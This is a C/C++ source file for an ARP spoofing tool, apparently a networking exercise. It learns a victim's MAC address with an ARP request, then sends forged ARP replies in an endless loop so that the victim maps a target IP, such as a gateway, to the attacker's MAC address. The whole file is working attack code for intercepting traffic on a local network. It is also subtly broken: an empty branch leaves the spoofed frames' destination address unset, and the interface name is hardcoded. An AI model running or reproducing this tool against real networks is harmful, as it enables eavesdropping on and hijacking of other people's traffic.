#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <cstdint>
#include <fstream>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <netinet/in.h> 

#define ETHERTYPE_ARP 0x0806

typedef struct ethernet_header{
	uint8_t dest[6];
	u_char source[6];
	uint16_t type;
} ETHER_HDR;

#pragma pack(1)
typedef struct arp_hdr{
	uint16_t hardware_type;
	uint16_t proto_type;
	uint8_t hardware_len;
	uint8_t proto_len;
    uint16_t opcode;
    uint8_t source_mac[6];
    struct in_addr source_ip;
    uint8_t desti_mac[6];
    struct in_addr desti_ip;
} ARP_HDR;

void usage(){
    printf("syntax: send_arp <interface> <victim ip> <target ip>\n");
    printf("sample: send_arp wlp2s0 192.168.10.2 192.168.10.1\n");
}

void GetMyMac(char* dev,unsigned char *my_mac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    strcpy(s.ifr_name, dev);
    if (ioctl(fd, SIOCGIFHWADDR, &s)) {
        printf("Can't Get Mac Address!!\n");
        exit(1);
    }
    memcpy(my_mac, s.ifr_addr.sa_data, 6);
}


void assign_ether(char *host_mac, ETHER_HDR *eth, char *desti_mac){
    if(strcmp(desti_mac,"")==0){
        for(int i =0; i<6; i++){
            eth->dest[i] = 0xFF;
        }
    }
    else{

    }
    memcpy(eth->source, host_mac, 6);
    eth->type = htons(ETHERTYPE_ARP);
}


void assign_arp(char *host_mac, ETHER_HDR *eth, ARP_HDR *arph, in_addr *victim_ip, char *victim_mac, in_addr *myip){
    arph->hardware_type = htons(0x0001);
    arph->proto_type = htons(0x0800);
    arph->hardware_len = 0x6;
    arph->proto_len = 0x4;
    if(strcmp(victim_mac,"")==0){
        arph->opcode = htons(0x0001);
        memset(arph->desti_mac,0,6);
    }  
    else{
        arph->opcode = htons(0x0002);
        memcpy(arph->desti_mac,victim_mac,6);
    }
    memcpy(arph->source_mac,host_mac,6);
    memcpy(&arph->source_ip.s_addr,myip,4);
    
    memcpy(&arph->desti_ip,victim_ip,4); 
}

void send_arp(ETHER_HDR *eth, ARP_HDR *arph, pcap_t *handle){
    //make and send frame
    int frame_length = sizeof(*eth)+sizeof(*arph);
    u_char frame[sizeof(*eth)+sizeof(*arph)];
    
    memset(frame,0,sizeof(*eth)+sizeof(*arph));
    memcpy(frame,eth,sizeof(*eth));
    memcpy(frame+sizeof(*eth),arph,sizeof(*arph));

    if (pcap_sendpacket(handle, frame, frame_length) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
        printf("SENDING ERROR!\n");
        exit(0);
    }        
    
    for (int i=0; i<frame_length; i++){
        if(i==16 || i==32){
            printf("\n");
        }
        printf("%.2x",frame[i]);
    }
    printf("\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

    char* dev = argv[1];
    struct in_addr victim_ip;
    inet_aton(argv[2],&victim_ip);
    struct in_addr target_ip;
    inet_aton(argv[3],&target_ip);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
    }

    struct in_addr myip;
    //get my ip
    struct ifaddrs * ifAddrStruct=NULL;
    struct ifaddrs * ifa=NULL;
    void * tmpAddrPtr=NULL;

    getifaddrs(&ifAddrStruct);

    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) {
            continue;
        }
        if (ifa->ifa_addr->sa_family == AF_INET and strcmp(ifa->ifa_name,"wlp2s0")==0) { // check it is IP4
            // is a valid IP4 Address
            tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
            char addressBuffer[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
            ///myip = addressBuffer;
            inet_aton(addressBuffer,&myip);
        } 
    }
    if (ifAddrStruct!=NULL) freeifaddrs(ifAddrStruct);

    u_char victim_mac[6];

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        
        //DO NOT CHEAT IT !!     
    	//Ethernet header - mac src, dst : 6bytes
        
        ETHER_HDR eth;
        ARP_HDR arph;
        char host_mac[6];
        GetMyMac(dev,(u_char*)host_mac);
        
        assign_ether(host_mac, &eth, "");
        assign_arp(host_mac, &eth, &arph, &victim_ip, "", &myip);   
        
        send_arp(&eth, &arph, handle);

        //Receive reply
        int cnt;

            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            
            ETHER_HDR *eth_rep;
            ARP_HDR *arph_rep;
          
            eth_rep = (ETHER_HDR*)packet;
            uint16_t eth_type = ntohs(eth_rep->type);
            printf("%.4X\n",eth_type);
            if(eth_type == ETHERTYPE_ARP){
                arph_rep = (ARP_HDR*)(packet+14);
                if(arph_rep->opcode==htons(0x0002)){
                    memcpy(victim_mac, arph_rep->source_mac, 6);
                    break;
                }
            }
            else{
                sleep(1);    
                continue;
            }  
    }
    printf("Victim_MAC     : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",victim_mac[0] , victim_mac[1] , victim_mac[2] , victim_mac[3] , victim_mac[4] , victim_mac[5]);
    
    /**********************************************************************************/
    //send spoofing frames (ARP Reply)
    while(1){
        struct pcap_pkthdr* header;
        const u_char* packet;
        
        ETHER_HDR eth;
        ARP_HDR arph;
        char host_mac[6];
        GetMyMac(dev,(u_char*)host_mac);
        
        assign_ether(host_mac, &eth, (char*)victim_mac);
        assign_arp(host_mac, &eth, &arph, &victim_ip, (char*)victim_mac, &target_ip);   
        printf("IP : %s\n",inet_ntoa(arph.source_ip));

        send_arp(&eth, &arph, handle);

        sleep(1);
    }

    pcap_close(handle);
    
    return 0;
}
